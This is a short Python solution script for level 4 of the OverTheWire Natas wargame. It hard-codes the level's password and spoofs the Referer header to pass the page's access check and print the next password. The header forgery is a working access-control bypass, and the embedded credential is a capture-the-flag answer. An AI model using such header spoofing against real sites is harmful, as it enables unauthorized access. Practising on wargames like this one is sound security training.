import requests

username = "natas4"
password = "Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ"

headers = {"Referer": "http://natas5.natas.labs.overthewire.org/"}

url = "http://{}.natas.labs.overthewire.org/".format(username)
response = requests.get(url, auth=(username, password), headers=headers)
content = response.text

print(content)
